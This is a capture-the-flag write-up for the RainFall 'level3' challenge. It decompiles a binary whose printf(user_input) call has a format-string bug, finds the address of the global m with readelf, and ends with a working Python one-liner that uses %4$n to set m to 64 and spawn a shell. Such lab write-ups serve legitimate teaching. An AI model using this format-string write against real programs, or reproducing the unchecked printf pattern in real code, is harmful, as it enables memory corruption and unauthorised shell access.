## Solutions

Okay first we decompile it

```c

int m;

void v(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}



void main(void)

{
  v();
  return;
}
```

we see that it have an exploit with printf called format string exploit, we can use this to change the value of m to 0x40 (64 in decimal) to pop the shell

first we have to locate the adress of M, to do so we use readelf

```bash
level3@RainFall:~$ readelf -s level3 | grep m
Symbol table '.dynsym' contains 10 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2)
     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
Symbol table '.symtab' contains 72 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
    32: 08049884     1 OBJECT  LOCAL  DEFAULT   25 completed.6159
    34: 08048480     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    56: 00000000     0 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.0
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    60: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    66: 0804988c     4 OBJECT  GLOBAL DEFAULT   25 m
    69: 0804851a    13 FUNC    GLOBAL DEFAULT   13 main
```

the address of m in memory is 0x0804988c --> \x8c\x98\x04\x08

to payload is crafted like this

TARGET ADRESS + 60 '|' + %4$n

60 '|' because value to overwrite(64) - len of address(4) = 60

%n is a printf flag that put the len of the input inside the memory address specified

%(number)$n is to locate the address \x8c\x98\x04\x08 specified in the local argument passed to printf, the 4 can be variable depending on the state of the stack during the exploitation

[more detail here](https://ir0nstone.gitbook.io/notes/types/stack/format-string)

```bash
(python -c 'print ("\x8c\x98\x04\x08" + "|" * 60 + "%4$n")'; cat) | ./level3
```